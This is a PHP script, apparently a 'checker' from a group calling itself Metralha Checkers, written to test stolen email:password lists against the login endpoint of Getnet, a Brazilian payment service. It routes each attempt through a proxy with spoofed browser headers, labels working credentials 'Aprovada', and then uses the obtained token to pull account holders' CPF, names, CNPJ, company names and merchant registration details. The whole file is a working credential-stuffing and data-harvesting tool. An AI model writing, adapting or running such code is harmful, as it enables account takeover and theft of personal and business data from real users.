<?php
date_default_timezone_set('America/Sao_Paulo');  
$tempo_real = date('d/m/Y h:i:s a', time()); 


## CRIADO E DESENVOLVIDO EXTREMAMENTE DO ÍNICIO "0".

// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================
    
    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $email = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}
    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}
    function novoBypass($length = 16) {
    $characters = '66c4aacab43222d7';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$contador = strlen($lista);

if ($contador < 8){

    die(json_encode(array("Error" => "Invalido, o conteudo informado esta devidamente incorrreto.")));
    
}

$metralhagostoso = substr($lista, 0, 8);

if (($metralhagostoso == 'Aprovada') or ($metralhagostoso == 'Aprovado')!== false) {

    die(json_encode(array("Error" => "Vai se foder kkkkkkk.", "Mensagemdometralha" => "Aqui nao amador...!")));

}




function reteste () {
$lista = $_GET['lista'];
$email = multiexplode(array(":", "|", ""), $lista)[0];
$senha = multiexplode(array(":", "|", ""), $lista)[1];



$metraialinklogin = 'https://getsso.getnet.com.br/auth/realms/external/protocol/openid-connect/token';

$metraia_postfield = 'username='.$email.'&password='.$senha.'&grant_type=password&client_id=minha-conta-web&scope=openid';

$headers_metraia = array (

'Accept: application/json, text/plain, */*',
'Connection: keep-alive',
'Content-type: application/x-www-form-urlencoded; charset=UTF-8',
'Host: getsso.getnet.com.br',
'Origin: https://minhaconta.getnet.com.br',
'Referer: https://minhaconta.getnet.com.br/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $metraialinklogin);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "COLOQUESUAPROXY:COLOQUESUAPROXY");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers_metraia);
curl_setopt($ini, CURLOPT_POSTFIELDS, $metraia_postfield);
$reteste = curl_exec($ini);


/* RETORNO  */

$jsona = json_decode($reteste, true);

$retorn = $jsona['error_description'];

if (empty($retorn)!==false ) {

    $verificar_retorn = "N/A - Resultados.";

} else {


    $verificar_retorn = ''.$retorn.'';

}

/* RETORNO  */

if (strpos($reteste, 'access_token')!== false ) {


    echo "<span class='badge badge-success'>#Aprovada</span> $lista <span class='badge badge-primary'>DETALHES:</span> Repasse novamente no checker para obter. <br>";


} else if (empty($reteste)!== false ) {

    echo "<span class='badge badge-danger'>#Error</span> $lista <span class='badge badge-info'>RETORNO (REECHECK):</span> N/A - Resultados. <br>";


} else {


    echo "<span class='badge badge-danger'>#Reprovada</span> $lista  <span class='badge badge-warning'>RETORNO(REECHECK):</span> $verificar_retorn <br>";

}
}



$metraialinklogin = 'https://getsso.getnet.com.br/auth/realms/external/protocol/openid-connect/token';

$metraia_postfield = 'username='.$email.'&password='.$senha.'&grant_type=password&client_id=minha-conta-web&scope=openid';

$headers_metraia = array (

'Accept: application/json, text/plain, */*',
'Connection: keep-alive',
'Content-type: application/x-www-form-urlencoded; charset=UTF-8',
'Host: getsso.getnet.com.br',
'Origin: https://minhaconta.getnet.com.br',
'Referer: https://minhaconta.getnet.com.br/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $metraialinklogin);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "COLOQUESUAPROXY:COLOQUESUAPROXY");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers_metraia);
curl_setopt($ini, CURLOPT_POSTFIELDS, $metraia_postfield);
$resposta = curl_exec($ini);
//$jaison = json_decode(curl_exec($ini), true);
$acess = metraiapuxar($resposta, '"access_token":"','"', 1);

/* RETORNO  */

$json = json_decode($resposta, true);

$retorno = $json['error_description'];

/* RETORNO  */


$link_user = "https://servicosportais.getnet.com.br/services/mc-cadastro/api/v2/usuario";


$headers_user = array (

'Accept: application/json, text/plain, */*',
'Authorization: Bearer '.$acess.'',
'Connection: keep-alive',
'Host: servicosportais.getnet.com.br',
'Origin: https://minhaconta.getnet.com.br',
'Referer: https://minhaconta.getnet.com.br/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77'

);

$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_user);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "COLOQUESUAPROXY:COLOQUESUAPROXY");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "GET");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers_user);
 $user_pefil = curl_exec($ini);




/* DETALHES PUCHADOS DO CURL PERFIL */

$dedocaruser = json_decode($user_pefil, true);

$username_cpf = metraiapuxar($user_pefil, '"username":"','"', 1);
$nome_user = metraiapuxar($user_pefil, '"name":"','"', 1);
$estabelecimentos_itens = metraiapuxar($user_pefil, '"itens":[',']},', 1);


$estabelecimentos_conta = metraiapuxar($user_pefil, '"estabelecimentos":[','],', 1);
$vendedores_estabelecimentos = metraiapuxar($user_pefil, '"vendedores":[',']}', 1);

/* DETALHES PUCHADOS DO CURL PERFIL */


/* PUCHAR INFORMACOES DO ESTABELECIMENTO */

$total_estabelecimentos = (int)metraiapuxar($user_pefil, '"total":',',', 1);
$cnpj_documento = metraiapuxar($user_pefil, '"documento":"','"', 1);
$razao_social = metraiapuxar($user_pefil, '"razaoSocial":"','"', 1);
$nome_fantasia = metraiapuxar($user_pefil, '"nomeFantasia":"','"', 1);
$pessoa_juridica = metraiapuxar($user_pefil, '"pessoaJuridica":',',', 1);
$bloqueo_dados = metraiapuxar($user_pefil, '"bloqueioDadosSensiveis":',',', 1);
$credenciado = metraiapuxar($user_pefil, '"credenciado":',',', 1);
$vinculo = metraiapuxar($user_pefil, '"vinculo":"','"', 1);
$inscricao_estadual = metraiapuxar($user_pefil, '"inscricaoEstadual":"','"', 1);

$motivo_nao_credenciado = metraiapuxar($user_pefil, '"statusCredenciamento":"','"', 1);

/* PUCHAR INFORMACOES DO ESTABELECIMENTO */


if (empty($motivo_nao_credenciado)!== false ) {

    $verificar_motivo = "N/A - Resultados.";

} else {

    $verificar_motivo = ''.$motivo_nao_credenciado.'';

}


if (empty($total_estabelecimentos)!== false ) {

    $verificar_total = "N/A - Resultados.";

} else {

    $verificar_total = ''.$total_estabelecimentos.'';

}

if (empty($cnpj_documento)!== false ) {

    $verificar_cnpj = "N/A - Resultados.";

} else {

    $verificar_cnpj = ''.$cnpj_documento.'';

}

if (empty($razao_social)!== false ) {

    $verificar_razaosocial = "N/A - Resultados.";

} else {

    $verificar_razaosocial = ''.$razao_social.'';
    
}


if (empty($nome_fantasia)!== false ) {

    $verificar_nomefantasia = "N/A - Resultados.";

} else {

    $verificar_nomefantasia = ''.$nome_fantasia.'';
    
}


if (empty($vinculo)!== false ) {

    $verificar_vinculo = "N/A - Resultados.";

} else {

    $verificar_vinculo = ''.$vinculo.'';
    
}


if (empty($inscricao_estadual)!== false ) {

    $verificar_inscestadual = "N/A - Resultados.";

} else {

    $verificar_inscestadual = ''.$inscricao_estadual.'';
    
}


if (empty($credenciado)!== false ) {

    $verificar_credenciado = "N/A - Resultados.";

} else if ($credenciado == 'true') {

    $verificar_credenciado = "Sim.";

} else {

    $verificar_credenciado = 'Não credenciado. - Motivo: ('.$verificar_motivo.')';

}


if (empty($bloqueo_dados)!== false ) {

    $verificar_bloqueo = "N/A - Resultados.";

} else if ($bloqueo_dados == 'false') {

    $verificar_bloqueo = "Não bloqueados.";

} else {

    $verificar_bloqueo = "Dados bloqueados.";

}


if (empty($pessoa_juridica)!== false) {

    $verificar_juridico = "N/A - Resultados.";

} else if ($pessoa_juridica == 'true') {

    $verificar_juridico = "Sim";

} else {

    $verificar_juridico = "Não";

}


if (empty($retorno)!== false) {

    $verificacao_retorno = "Falha (N/A)";

} else {

    $verificacao_retorno = ''.$retorno.'';

}



if (empty($username_cpf)!== false) {

    $verificar_cpfuser = "N/A - Resultados.";

} else {

    $verificar_cpfuser = ''.$username_cpf.'';

}


if (empty($nome_user)!== false) {

    $verificar_nomeuser = "N/A - Resultados.";

} else {

    $verificar_nomeuser = ''.$nome_user.'';
    
}

if (empty($estabelecimentos_itens)!== false) {

    $verificar_stabitens = "N/A - Resultados.";

} else {

    $verificar_stabitens = ''.$estabelecimentos_itens.'';
    
}

if (empty($estabelecimentos_conta)!== false) {

    $verificar_estabconta = "N/A - Resultados.";

} else {

    $verificar_estabconta = ''.$estabelecimentos_conta.'';
    
}

if (empty($vendedores_estabelecimentos)!== false) {

    $verificar_vendedores = "N/A - Resultados.";

} else {

    $verificar_vendedores = ''.$vendedores_estabelecimentos.'';
    
}



// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//
         

if (strpos($resposta, 'access_token')!== false ) {

echo "<font color='white'><span class='badge badge-success'>#Aprovada</span> $email|$senha  <span class='badge badge-info'>RETORNO:</span> Autenticado. <span class='badge badge-primary'>USERNAME(CPF):</span> $verificar_cpfuser <span class='badge badge-primary'>NOME:</span> $verificar_nomeuser  <span class='badge badge-primary'>ITENS (ESTABELECIMENTOS):</span> $verificar_stabitens  <span class='badge badge-primary'>ESTABELECIMENTOS:</span> $verificar_total  <span class='badge badge-primary'>CNPJ:</span> $verificar_cnpj  <span class='badge badge-primary'>RAZAO SOCIAL:</span> $verificar_razaosocial  <span class='badge badge-primary'>NOME FANTASIA:</span> $verificar_nomefantasia  <span class='badge badge-primary'>SITUACAO ATUAL:</span> $verificar_vinculo  <span class='badge badge-primary'>INSC-ESTADUAL:</span> $verificar_inscestadual  <span class='badge badge-primary'>CREDENCIADO:</span> $verificar_credenciado  <span class='badge badge-primary'>BLOQUEO DADOS:</span> $verificar_bloqueo  <span class='badge badge-primary'>PESSOA JURIDICO(A):</span> $verificar_juridico </font> <br>";


} else if (strpos($resposta, 'have permission to access')!== false ) {


    echo "<font color='white' ><span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> N/A </font> <br>";

    reteste();

} else {


    echo "<font color='white' ><span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> $verificacao_retorno </font> <br>";

 
}
?>